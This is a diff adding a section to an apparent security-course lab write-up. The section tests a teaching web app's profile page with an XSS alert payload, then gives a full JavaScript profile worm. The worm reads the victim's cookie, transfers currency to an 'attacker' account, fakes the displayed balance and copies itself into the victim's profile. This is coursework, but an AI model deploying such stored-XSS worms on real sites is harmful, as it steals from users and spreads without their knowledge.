@@ -76,7 +76,93 @@ After executing the code and performing a $\$1$ transaction, the balance of our 
 
 ### e
 
+
+
 ### f
+
+First, let's test if the profile page is vulnerable by using the following text as the profile text:
+
+```html
+<script>alert("ATTACK");</script>
+```
+
+Seeing the alert, we can confirm that the profile page is vulnerable:
+
+![f-test](./images/f-test.png)
+
+Now we can construct our profile worm as follows:
+
+```javascript
+function getCurrentUsername() {
+    const b64 = document.cookie.slice(8);
+    const data = JSON.parse(atob(b64));
+    return data.account.username;
+}
+function fakeBitbarCount(amount) {
+    const observer = new MutationObserver(mutations => {
+        const span = document.getElementById("bitbar_count");
+        if (span === null) {
+            return;
+        }
+        span.className = amount;
+        observer.disconnect();
+    });
+    observer.observe(document.body, { childList: true, subtree: true, attributes: false });
+}
+async function transfer(username, quantity) {
+    const r = await fetch("/post_transfer", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
+        },
+        body: `destination_username=${username}&quantity=${quantity}`
+    });
+    const text = await r.text();
+    const success = text.includes("Successfully transferred");
+    return success;
+}
+async function getProfile(username) {
+    const r = await fetch("/profile?username=" + username, {
+        credentials: "include"
+    });
+    const text = await r.text();
+    const doc = new DOMParser().parseFromString(text, 'text/html');
+    const profile = doc.getElementById('profile')?.innerHTML;
+    return profile ?? "";
+}
+async function setProfile(content) {
+    const encoded = encodeURIComponent(content);
+    const r = await fetch("/set_profile", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
+        },
+        body: `new_profile=${encoded}`
+    });
+    return r.ok;
+}
+async function attack() {
+    const attacker = "attacker";
+    const user = getCurrentUsername();
+    if (user === attacker) {
+        console.log("Does not trigger on attacker account.");
+        return;
+    } else {
+        console.log("Attacking " + user);
+    }
+    fakeBitbarCount(10);
+    transfer(attacker, 1).then(succ => {
+        console.log("Transfer success: " + succ);
+    });
+    const attackerProfile = await getProfile(attacker);
+    console.log("Attacker profile: " + attackerProfile);
+    const success = await setProfile(attackerProfile);
+    console.log("Set profile success: " + success);
+}
+attack();
+```
 
 ### g
 
